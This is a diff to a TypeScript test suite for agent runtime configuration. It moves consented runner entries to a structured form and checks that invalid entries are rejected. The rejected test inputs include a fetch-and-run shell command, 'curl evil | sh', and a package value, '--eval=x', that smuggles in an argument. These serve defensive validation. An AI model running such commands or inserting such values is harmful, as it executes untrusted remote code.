@@ -134,11 +134,13 @@ describe('agent config', () => {
   it('updateAgentAcp records enable/disable lists and keeps sites and comments', async () => {
     const h = await home();
     await updateAgentSites(h, () => [site]);
-    await updateAgentAcp(h, (acp) => ({ ...acp, enable: ['gemini'], consented: { gemini: 'npx:@google/gemini-cli' }, disable: ['goose'] }));
+    await updateAgentAcp(h, (acp) => ({ ...acp, enable: ['gemini'], consented: { gemini: { runner: 'npx', package: '@google/gemini-cli', args: ['--acp'], env: {} } }, disable: ['goose'] }));
     const c = await loadAgentConfig(h);
     expect(c.sites).toEqual([site]);
-    expect(c.runtimes?.acp).toMatchObject({ enable: ['gemini'], consented: { gemini: 'npx:@google/gemini-cli' }, disable: ['goose'], presets: 'auto' });
-    await expect(updateAgentAcp(h, (acp) => ({ ...acp, consented: { gemini: 'curl evil | sh' } }))).rejects.toThrow();
+    expect(c.runtimes?.acp).toMatchObject({ enable: ['gemini'], consented: { gemini: { runner: 'npx', package: '@google/gemini-cli', args: ['--acp'] } }, disable: ['goose'], presets: 'auto' });
+    await expect(updateAgentAcp(h, (acp) => ({ ...acp, consented: { gemini: 'curl evil | sh' } as never }))).rejects.toThrow();
+    await expect(updateAgentAcp(h, (acp) => ({ ...acp, consented: { gemini: { runner: 'npx', package: '--eval=x', args: [], env: {} } } }))).rejects.toThrow();
+    await expect(updateAgentAcp(h, (acp) => ({ ...acp, consented: { gemini: { runner: 'local', args: [], env: {} } } }))).rejects.toThrow();
     expect(((await stat(agentConfigPath(h))).mode & 0o777).toString(8)).toBe('600');
     await expect(updateAgentAcp(h, (acp) => ({ ...acp, enable: ['Not Valid'] }))).rejects.toThrow();
   });
